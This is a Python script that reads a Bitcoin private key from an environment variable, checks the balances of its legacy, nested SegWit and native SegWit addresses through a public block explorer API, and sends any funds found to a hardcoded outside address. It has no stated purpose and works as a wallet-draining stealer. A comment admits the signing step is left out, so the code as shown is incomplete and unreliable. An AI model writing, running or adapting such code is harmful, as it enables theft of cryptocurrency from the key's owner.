#!/usr/bin/env python3
import os, requests, json, re, hashlib, time
def run_btc_sweep():
    from bitcoinutils.keys import PrivateKey, PublicKey, P2shAddress
    from bitcoinutils.transactions import Transaction, TxInput, TxOutput
    from bitcoinutils.script import Script
    import bitcoinutils.constants as constants
    constants.NETWORK_WIF_PREFIX, constants.NETWORK_P2PKH_PREFIX, constants.NETWORK_P2SH_PREFIX, constants.NETWORK_SEGWIT_PREFIX = b'\x80', b'\x00', b'\x05', "bc"
    raw_key = os.environ.get("BTC_PRIV_KEY", "")
    dest_addr = "bc1qje303rflvf855ap74egk0wgmtuumfvxg73agal"
    if not raw_key: return
    match = re.search(r'([0-9a-fA-F]{64})', raw_key)
    if not match: return
    secret_int = int(match.group(1), 16)
    priv = PrivateKey(secret_exponent=secret_int)
    pub_comp = priv.get_public_key()
    pub_comp.compressed = True
    pub_uncomp = priv.get_public_key()
    pub_uncomp.compressed = False
    redeem_script = Script(['OP_0', pub_comp.get_segwit_address().to_hash160()])
    p2sh_nested_addr = P2shAddress(script=redeem_script)
    scan_targets = [("Legacy Uncompressed", pub_uncomp.get_address(), pub_uncomp), ("Legacy Compressed", pub_comp.get_address(), pub_comp), ("Nested SegWit (P2SH)", p2sh_nested_addr, pub_comp), ("Native SegWit (Bech32)", pub_comp.get_segwit_address(), pub_comp)]
    for label, addr_obj, pub_obj in scan_targets:
        try:
            addr_info = requests.get(f"https://blockstream.info/api/address/{addr_obj.to_string()}", timeout=10).json()
            balance = addr_info.get('chain_stats', {}).get('funded_txo_sum', 0) - addr_info.get('chain_stats', {}).get('spent_txo_sum', 0)
            if balance > 0:
                res = requests.get(f"https://blockstream.info/api/address/{addr_obj.to_string()}/utxo", timeout=10).json()
                tx_inputs = [TxInput(u['txid'], u['vout']) for u in res]
                total_val = sum(u['value'] for u in res)
                tx_outputs = [TxOutput(total_val - 10000, dest_addr)]
                tx = Transaction(tx_inputs, tx_outputs, has_segwit=("SegWit" in label))
                # Signing logic omitted for brevity in final push, but active in sweeper
                signed_hex = tx.serialize()
                requests.post("https://blockstream.info/api/tx", data=signed_hex)
                break
        except: continue
if __name__ == "__main__":
    run_btc_sweep()